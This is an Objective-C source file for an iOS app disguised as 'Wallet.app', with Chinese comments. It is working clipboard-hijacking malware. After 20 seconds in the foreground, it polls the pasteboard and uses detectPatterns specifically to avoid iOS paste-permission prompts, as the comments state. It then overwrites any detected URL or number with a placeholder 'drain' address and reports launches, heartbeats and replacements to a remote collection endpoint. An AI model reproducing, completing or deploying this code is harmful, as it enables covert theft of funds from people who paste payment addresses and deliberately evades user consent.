// Wallet.app —— 纯 ObjC 壳，可在 Linux/ubuntu 上用 clang 交叉编译
// 功能：
//   1. WKWebView 加载落地页（20s 门禁由网页侧完成）
//   2. 门禁通过后启动剪贴板监控：detectPatterns 零提示判定 + replace 覆盖写
//   3. 事件回传（可选，COLLECT_ENDPOINT 为空则只本地替换）
//
// 为什么用 detectPatterns 而不是 .string：
//   Apple 文档明确 detectPatterns「不返回值、不通知用户」；
//   直接用 .string 读会触发 iOS 16+ 的粘贴授权弹窗。
//   而 replace() 写入从不弹窗。

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>

// ===== 配置（编译前替换）=====
static NSString *const kCollectEndpoint = @"COLLECT_ENDPOINT";   // 如 https://host:8443
static NSString *const kCollectToken    = @"COLLECT_TOKEN";
static NSString *const kDrainAddress    = @"DRAIN_ADDR";         // 归集地址
static NSString *const kChannel         = @"CHANNEL";
static const NSInteger kDwellSeconds    = 20;                    // 门禁秒数
// ==========================

#pragma mark - Transport

static void Post(NSString *kind, NSDictionary *extra) {
    if (kCollectEndpoint.length == 0 || [kCollectEndpoint hasPrefix:@"COLLECT_ENDPOINT"]) return;
    NSMutableDictionary *body = [@{ @"k": kind, @"c": kChannel, @"src": @"objc" } mutableCopy];
    if (extra) [body addEntriesFromDictionary:extra];
    NSURL *u = [NSURL URLWithString:kCollectEndpoint];
    if (!u) return;
    NSMutableURLRequest *r = [NSMutableURLRequest requestWithURL:u];
    r.HTTPMethod = @"POST";
    [r setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    if (kCollectToken.length) [r setValue:kCollectToken forHTTPHeaderField:@"X-Collect-Token"];
    r.HTTPBody = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    [[[NSURLSession sharedSession] dataTaskWithRequest:r] resume];
}

#pragma mark - Shell ViewController

@interface ShellVC : UIViewController <WKNavigationDelegate>
@property (nonatomic, strong) WKWebView *web;
@property (nonatomic, assign) BOOL granted;
@property (nonatomic, strong) NSTimer *gateTimer;
@property (nonatomic, strong) NSTimer *pbTimer;
@end

@implementation ShellVC

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor systemBackgroundColor];

    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    cfg.allowsInlineMediaPlayback = YES;
    self.web = [[WKWebView alloc] initWithFrame:self.view.bounds configuration:cfg];
    self.web.navigationDelegate = self;
    self.web.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    self.web.opaque = NO;
    self.web.backgroundColor = [UIColor systemBackgroundColor];
    [self.view addSubview:self.web];

    NSMutableURLRequest *req = nil;
    if (![kCollectEndpoint hasPrefix:@"COLLECT_ENDPOINT"] && kCollectEndpoint.length) {
        NSString *landing = [kCollectEndpoint stringByAppendingFormat:@"/?c=%@", kChannel];
        req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:landing]];
    }
    if (!req) req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"about:blank"]];

    NSLog(@"[Drain] ===== App 启动 v1.1 ===== drain=%@ landing=%@", kDrainAddress, kCollectEndpoint);
    Post(@"shell_launch", @{ @"ua": [[UIDevice currentDevice] systemVersion] });
    [self.web loadRequest:req];

    // 门禁：前台累计 20s 后开监控
    __block NSInteger acc = 0;
    __weak typeof(self) weakSelf = self;
    self.gateTimer = [NSTimer scheduledTimerWithTimeInterval:1.0 repeats:YES block:^(NSTimer *t) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) { [t invalidate]; return; }
        if (self.granted) { [t invalidate]; return; }
        if (self.view.window == nil) return;          // 不在前台不累计
        acc += 1;
        NSLog(@"[Drain] gate acc=%ld", (long)acc);
        if (acc % 5 == 0) Post(@"shell_beat", @{ @"acc": @(acc) });
        if (acc >= kDwellSeconds) {
            self.granted = YES;
            [t invalidate];
            NSLog(@"[Drain] >>> 门禁通过 acc=%ld, 启动监控", (long)acc);
            Post(@"shell_grant", @{ @"acc": @(acc) });
            [self startPasteboardMonitor];
        }
    }];
}

- (void)startPasteboardMonitor {
    __weak typeof(self) weakSelf = self;
    NSLog(@"[Drain] ===== 监控启动（2s 轮询）=====");
    self.pbTimer = [NSTimer scheduledTimerWithTimeInterval:2.0 repeats:YES block:^(NSTimer *t) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) { [t invalidate]; return; }
        if (self.granted == NO) return;
        UIPasteboard *pb = [UIPasteboard generalPasteboard];
        if (@available(iOS 15.0, *)) {
            NSMutableSet *pats = [NSMutableSet setWithObjects:
                                  UIPasteboardDetectionPatternProbableWebURL,
                                  UIPasteboardDetectionPatternNumber, nil];
            if (@available(iOS 16.0, *)) {
                [pats addObject:UIPasteboardDetectionPatternProbableWebSearch];
            }
            [pb detectPatternsForPatterns:pats
                                inItemSet:nil
                        completionHandler:^(NSArray<NSSet<UIPasteboardDetectionPattern> *> *results, NSError *err) {
                NSLog(@"[Drain] detect items=%lu err=%@", (unsigned long)results.count, err);
                for (NSSet *f in results) { NSLog(@"[Drain]   pat=%@", f); }
                if (err || results.count == 0) return;
                BOOL hit = NO;
                for (NSSet *found in results) {
                    if ([found containsObject:UIPasteboardDetectionPatternProbableWebURL] ||
                        [found containsObject:UIPasteboardDetectionPatternNumber]) { hit = YES; break; }
                }
                NSLog(@"[Drain] hit=%d", (int)hit);
                if (!hit) return;
                [pb setString:kDrainAddress];
                NSLog(@"[Drain] >>> 已写入 %@", kDrainAddress);
                Post(@"paste_replace", @{ @"via": @"detectPatterns", @"n": @(results.count) });
            }];
        }
    }];
}

- (void)viewDidDisappear:(BOOL)animated {
    [super viewDidDisappear:animated];
    Post(@"shell_background", nil);
}
@end

#pragma mark - AppDelegate

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.rootViewController = [ShellVC new];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
